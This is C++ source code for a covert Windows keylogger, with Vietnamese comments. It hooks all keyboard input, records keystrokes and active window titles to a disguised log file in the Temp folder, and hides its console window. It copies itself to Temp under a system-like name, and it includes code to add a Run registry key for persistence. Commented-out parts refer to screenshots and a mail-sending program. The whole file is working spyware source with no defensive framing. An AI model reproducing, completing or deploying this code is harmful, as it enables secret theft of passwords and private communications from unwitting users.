// Keylogger.cpp : Defines the entry point for the console application.
//
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <string.h>
#include <winstring.h>
#include <String>
#include <atlstr.h>  
#include <iostream>
#include <direct.h>
#include "CaptureSCR.h"
#include <ctime>
#include <sstream>
#include <conio.h>
#include <vector>
#include "resource.h"
using namespace std;
HHOOK KeyboardHook;


//goi hook key
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
//LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
void write(const char* c)
{

	CHAR temp_file[255];
	GetTempPathA(255, temp_file);
	strcat_s(temp_file, "WindowsSystemDirectoryLogs\\logs.txt");
	fstream f;
	f.open(temp_file, ios::app);
	f << c;
	f.close();

}

//khoi dong cung windows
void StartWin()
{
	CHAR path[MAX_PATH];
	GetModuleFileNameA(0, path, 255);
	ifstream source(path, ios::binary);
	CHAR temp[MAX_PATH];
	CString path_full;
	GetTempPathA(255, temp);
	path_full = temp + CString("WindowsSystemDirectorySetup\\Windowsautofiledevice.exe");
	HKEY hkey = NULL;
	RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey, L"Windows", 0, REG_SZ, (BYTE*)path_full.GetBuffer(), (sizeof(path) + 1) * 2);
}
void MoveFile()
{
	CHAR temp[MAX_PATH];
	CString path_full;
	GetTempPathA(255, temp);
	strcat_s(temp, "WindowsSystemDirectoryLogs");
	DWORD attribstr = GetFileAttributesA(temp);
	if (attribstr == INVALID_FILE_ATTRIBUTES)
		CreateDirectoryA(temp, NULL);
	//tao thu muc con trong Temp chua file exe
	CHAR temp2[MAX_PATH];
	GetTempPathA(255, temp2);
	strcat_s(temp2, "WindowsSystemDirectorySetup");
	DWORD attribs = GetFileAttributesA(temp2);
	if (attribs == INVALID_FILE_ATTRIBUTES)
		CreateDirectoryA(temp2, NULL);

	//di chuyen file
	CHAR dst[MAX_PATH];
	GetModuleFileNameA(0, dst, 255);
	ifstream source(dst, ios::binary);
	CHAR temp3[MAX_PATH];
	CString path_tmp;
	GetTempPathA(255, temp3);
	path_tmp = temp3 + CString("WindowsSystemDirectorySetup\\Windowsautofiledevice.exe");
	ofstream dest(path_tmp, ios::out | ios::binary);
	dest << source.rdbuf();
	source.close();
	dest.close();
	//chay file gui mail
	/*
	CHAR temp4[MAX_PATH];
	GetTempPathA(255, temp4);
	CString path_mail = temp4 + CString("WindowsSystemDirectorySetup\\Windowsautofileservice.exe");
	strcat_s(temp4, "WindowsSystemDirectorySetup\\Windowsautofileservice.exe");
	*/
		//cap.ScreenCapture(500, 200, filename);
}
//KEYLOGGER chay an khoi chuong trinh
void KeepAlive()
{
	HWND self = GetConsoleWindow();
	ShowWindow(self, SW_HIDE);
	HINSTANCE app = GetModuleHandle(NULL);
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);

	}

}

// Thoat
void Exit()
{
	UnhookWindowsHookEx(KeyboardHook);
	exit(0);
}

// Kiem tra shift
bool shift = false;
// thu muc chua file
HWND oldWindow = NULL;
// duong dan file3
char cWindow[MAX_PATH];

// Goi va Dinh nghia hook key
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	//StartWin();
	MoveFile();
	CaptureSCR cap;
	char*filename;
	time_t now = time(0);
	stringstream strstr;
	strstr << now;
	strstr << ".bmp";
	string temp_str = strstr.str();
	filename = (char*)temp_str.c_str();
	bool bControlKeyDown = 0;
	// Kiem tra trang thai Caps Lock
	bool caps = GetKeyState(VK_CAPITAL) < 0;
	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
	if (nCode == HC_ACTION) {
		// Kiem tra trang thai Shift
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
			if (wParam == WM_KEYDOWN)
			{
				shift = true;
			}
			else
			{
				shift = false;
			}
		}
		// Kiem tra  Ctrl + F12
		bControlKeyDown = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
		if (p->vkCode == VK_F12 && bControlKeyDown) // neu bam Ctrl +F12 thi Exit
		{
			Exit();
		}
		// Start-- Bat dau bat phim
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) // Bam 1 phim bat ki
		{
			HWND newWindow = GetForegroundWindow(); //lay cua so hien tai
			if (oldWindow == NULL || newWindow != oldWindow) {
				// Luu vao file
				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));//lay tieu de cua so hien tai
				write("\nActive Window: ");
				write(cWindow);
				write("\n");
				oldWindow = newWindow;
			}

			switch (p->vkCode)
			{
			case 0x30: write(shift ? ")" : "0"); break;
			case 0x31: write(shift ? "!" : "1"); break;
			case 0x32: write(shift ? "@" : "2"); break;
			case 0x33: write(shift ? "#" : "3"); break;
			case 0x34: write(shift ? "$" : "4"); break;
			case 0x35: write(shift ? "%" : "5"); break;
			case 0x36: write(shift ? "^" : "6"); break;
			case 0x37: write(shift ? "&" : "7"); break;
			case 0x38: write(shift ? "*" : "8"); break;
			case 0x39: write(shift ? "(" : "9"); break;

			case 0x41: write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
			case 0x42: write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
			case 0x43: write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
			case 0x44: write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
			case 0x45: write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
			case 0x46: write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
			case 0x47: write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
			case 0x48: write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
			case 0x49: write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
			case 0x4A: write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
			case 0x4B: write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
			case 0x4C: write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
			case 0x4D: write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
			case 0x4E: write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
			case 0x4F: write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
			case 0x50: write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
			case 0x51: write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
			case 0x52: write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
			case 0x53: write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
			case 0x54: write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
			case 0x55: write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
			case 0x56: write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
			case 0x57: write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
			case 0x58: write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
			case 0x59: write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
			case 0x5A: write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;

			case 0x60: write("0"); break;
			case 0x61: write("1"); break;
			case 0x62: write("2"); break;
			case 0x63: write("3"); break;
			case 0x64: write("4"); break;
			case 0x65: write("5"); break;
			case 0x66: write("6"); break;
			case 0x67: write("7"); break;
			case 0x68: write("8"); break;
			case 0x69: write("9"); break;

			case VK_SPACE: write(" "); break;
			case VK_RETURN: 
			{
				write("[ENTER]"); 
				//cap.ScreenCapture(500, 200, filename);
				//Sleep(1000);
				break;
			}

			case VK_TAB: write("\t"); break;
			case VK_ESCAPE: write("[ESC]"); break;
			case VK_LEFT: write("[LEFT]"); break;
			case VK_RIGHT: write("[RIGHT]"); break;
			case VK_UP: write("[UP]"); break;
			case VK_DOWN: write("[DOWN]"); break;
			case VK_END: write("[END]"); break;
			case VK_HOME: write("[HOME]"); break;
			case VK_DELETE: write("[DELETE]"); break;
			case VK_BACK: write("[BACKSPACE]"); break;
			case VK_INSERT: write("[INSERT]"); break;
			case VK_LCONTROL: write("[CTRL]"); break;
			case VK_RCONTROL: write("[CTRL]"); break;
			case VK_LMENU: write("[ALT]"); break;
			case VK_RMENU: write("[ALT]"); break;
			case VK_F1: write("[F1]"); break;
			case VK_F2: write("[F2]"); break;
			case VK_F3: write("[F3]"); break;
			case VK_F4: write("[F4]"); break;
			case VK_F5: write("[F5]"); break;
			case VK_F6: write("[F6]"); break;
			case VK_F7: write("[F7]"); break;
			case VK_F8: write("[F8]"); break;
			case VK_F9: write("[F9]"); break;
			case VK_F10: write("[F10]"); break;
			case VK_F11: write("[F11]"); break;
			case VK_F12: write("[F12]"); break;

			case VK_LSHIFT: break; // Shift trai
			case VK_RSHIFT: break; // Shift phai

			case VK_OEM_1: write(shift ? ":" : ";"); break;
			case VK_OEM_2: write(shift ? "?" : "/"); break;
			case VK_OEM_3: write(shift ? "~" : "`"); break;
			case VK_OEM_4: write(shift ? "{" : "["); break;
			case VK_OEM_5: write(shift ? "|" : "\\"); break;
			case VK_OEM_6: write(shift ? "}" : "]"); break;
			case VK_OEM_7: write(shift ? "\"" : "'"); break;
			case VK_OEM_PLUS: write(shift ? "+" : "="); break;
			case VK_OEM_COMMA: write(shift ? "<" : ","); break;
			case VK_OEM_MINUS: write(shift ? +"_" : "-"); break;
			case VK_OEM_PERIOD: write(shift ? ">" : "."); break;
			default:
				DWORD dwMsg = p->scanCode << 16;
				dwMsg += p->flags << 24;
				char key[255];
				GetKeyNameText(dwMsg, LPWSTR(key), 254);
				write(key);
				break;
			}
		}
	}
	// Chuyen den hook khac

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// WinAPI main method
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	// Hook to all available threads
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, NULL);
	if (KeyboardHook != NULL)
	{
		// goi Keeplive
		KeepAlive();
	}
	return 0;
}
